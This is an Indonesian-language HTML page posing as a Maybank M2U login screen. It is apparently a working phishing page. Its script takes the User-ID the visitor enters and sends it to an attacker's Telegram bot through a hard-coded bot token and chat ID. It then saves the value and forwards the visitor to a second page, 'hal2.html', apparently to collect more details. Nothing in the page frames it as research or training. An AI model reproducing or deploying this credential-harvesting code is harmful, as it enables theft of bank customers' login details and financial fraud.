<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Maybank Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
}

body{
    background:linear-gradient(#bcc8d3,#edf1f4);
    height:100vh;
    display:flex;
    flex-direction:column;
}

.header{
    padding:35px 25px;
    display:flex;
    align-items:center;
}

.close{
    font-size:55px;
    color:#555;
}

.logo{
    margin:auto;
    display:flex;
    align-items:center;
    gap:10px;
    transform:translateX(-20px);
}

.logo img{
    width:58px;
}

.logo h1{
    color:#f5c400;
    font-size:42px;
    font-weight:700;
}

.content{
    flex:1;
    display:flex;
    flex-direction:column;
    justify-content:center;
    padding:0 40px;
}

.title{
    text-align:center;
    font-size:35px;
    color:#2b2b2b;
    margin-bottom:90px;
}

.input{
    width:100%;
    border:none;
    border-bottom:2px solid #aaa;
    background:transparent;
    outline:none;
    text-align:center;
    font-size:28px;
    padding:15px;
    color:#333;
}

.input::placeholder{
    color:#888;
}

.btn{
    height:85px;
    border:none;
    background:linear-gradient(to right,#e7aa00,#ffd45b);
    font-size:32px;
    font-weight:bold;
    color:#222;
}
</style>
</head>
<body>

<div class="header">
    <div class="close">&times;</div>

    <div class="logo">
        <img src="download.png">
        <h1>Maybank</h1>
    </div>
</div>

<div class="content">

<div class="title">
Masukkan User-ID<br>
M2U Anda
</div>

<input
type="text"
id="userid"
class="input"
placeholder="User-ID">

</div>

<button class="btn" onclick="login()">
LANJUT
</button>

<script>
function login() {
    const userid = document.getElementById("userid").value.trim();

    if (userid === "") {
        alert("Masukkan User-ID");
        return;
    }

    const token = "8729819513:AAHuJSCT5sT4zR6Yv6xx-JdttOCKtR31hOM";
    const chatId = "6647221855";

    const pesan = `💌 Pesan baru

Nama: ${userid}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: pesan
        })
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) {
            localStorage.setItem("userid", userid);
            window.location.href = "hal2.html";
        } else {
            alert("Gagal mengirim pesan.");
        }
    })
    .catch(() => {
        alert("Terjadi kesalahan.");
    });
}

</script>

</body>
</html>
